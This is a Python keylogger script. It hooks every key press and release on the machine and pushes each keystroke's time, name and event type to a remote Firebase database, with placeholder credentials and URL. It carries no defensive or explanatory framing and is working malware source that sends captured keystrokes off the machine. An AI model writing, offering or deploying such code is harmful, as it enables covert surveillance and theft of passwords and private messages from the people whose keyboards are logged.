import os
import keyboard
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db

LOG_FILE = 'log.txt'

# Set up Firebase credentials
cred = credentials.Certificate('path/to/firebase_credentials.json')
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://your-firebase-database-url.firebaseio.com/'
})

# Create the log file if it doesn't exist
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as f:
        f.write('')

# Define the function to handle key events
def on_event(event):
    ref = db.reference('keystrokes')
    ref.push({
        'time': event.time,
        'name': event.name,
        'event_type': event.event_type
    })

# Set up the key press and release hooks
keyboard.on_press(on_event)
keyboard.on_release(on_event)

# Record keystrokes
keyboard.wait()
